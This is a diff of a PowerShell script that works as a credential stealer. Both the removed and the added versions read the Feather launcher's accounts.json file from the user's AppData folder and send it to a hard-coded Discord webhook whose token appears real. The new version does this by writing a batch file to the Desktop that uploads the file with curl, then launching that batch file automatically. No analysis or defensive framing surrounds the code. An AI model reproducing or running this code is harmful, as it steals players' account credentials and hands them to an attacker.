@@ -1,33 +1,54 @@
-# Discord Webhook URL
-$webhookUrl = "https://discord.com/api/webhooks/1357740527637758222/vEIwp5BR2jFWTvegjKyEBAo5x-9hP6DvIxurkGDbFRijQ_-ZYvTiphi_nNz1iW-c_bch"
+# Define the path for the batch file
+$desktopPath = [System.Environment]::GetFolderPath('Desktop')
+$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
 
-# Path to the accounts.json file
-$filePath = "$env:USERPROFILE\AppData\Roaming\.feather\accounts.json"
+# Define the content of the batch file
+$batchContent = @"
+@echo off
+setlocal enabledelayedexpansion
 
-# Check if the file exists
-if (-not (Test-Path $filePath)) {
-    Write-Host "File accounts.json does not exist at the specified path."
-    exit
-}
+:: Discord Webhook URL
+set webhookUrl=https://discord.com/api/webhooks/1357740527637758222/vEIwp5BR2jFWTvegjKyEBAo5x-9hP6DvIxurkGDbFRijQ_-ZYvTiphi_nNz1iW-c_bch
 
-# Read the contents of the accounts.json file
-$fileContents = Get-Content -Path $filePath -Raw
+:: Path to the accounts.json file
+set filePath=%USERPROFILE%\AppData\Roaming\.feather\accounts.json
 
-# Prepare payload JSON
-$payload = @{
-    content = $fileContents
-} | ConvertTo-Json -Depth 3
+:: Check if the file exists
+if not exist "%filePath%" (
+    echo File accounts.json does not exist at the specified path.
+    exit /b
+)
 
-# Send the request
-try {
-    $response = Invoke-WebRequest -Uri $webhookUrl -Method Post -Body $payload -ContentType "application/json"
+:: Prepare message
+set message=Here you go king :pray:
 
-    # Check if the request succeeded
-    if ($response.StatusCode -eq 200) {
-        Write-Host "Contents sent successfully!"
-    } else {
-        Write-Host "Failed to send the webhook request. Status Code: $($response.StatusCode)"
-    }
-} catch {
-    Write-Host "Error: $($_.Exception.Message)"
-}
+:: Correcting the payload format
+set payload={\"content\":\"%message%\"}
+
+:: Escape the payload for the curl request
+set payload_json={\"content\":\"%message%\"}
+
+:: Prepare CURL command for sending the request
+curl -X POST %webhookUrl% ^
+     -H "Content-Type: multipart/form-data" ^
+     -F "payload_json=%payload_json%" ^
+     -F "file=@%filePath%" 
+
+if %errorlevel% neq 0 (
+    echo Failed to send the webhook request.
+) else (
+    echo File sent successfully!
+)
+
+endlocal
+"@
+
+# Write the content to the batch file
+Set-Content -Path $batchFilePath -Value $batchContent
+
+# Output a message to confirm creation
+Write-Host "Batch file created at $batchFilePath"
+
+# Run the batch file automatically
+Start-Process -FilePath $batchFilePath
+Write-Host "Batch file is now running..."
